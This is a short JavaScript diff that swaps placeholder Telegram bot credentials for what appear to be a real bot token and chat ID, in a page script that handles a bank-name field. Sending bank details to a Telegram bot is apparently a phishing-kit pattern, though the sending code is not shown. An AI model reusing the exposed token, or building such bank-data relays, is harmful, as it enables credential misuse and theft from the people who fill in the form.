@@ -15,8 +15,8 @@ document.addEventListener('DOMContentLoaded', () => {
     const bankNameInput = document.getElementById('bank-name');
 
     // Replace these credentials with your actual Telegram Bot details
-    const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
-    const TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';
+    const TELEGRAM_BOT_TOKEN = '8632514796:AAFB0-FZUx-WSJ9jiqg-h6lOHNWGCXMBx-Q';  // Replaced with your token
+    const TELEGRAM_CHAT_ID = '7436313123'; // Replaced with your chat ID
 
     // Handle initial state
     qrSection.classList.add('hidden-field');
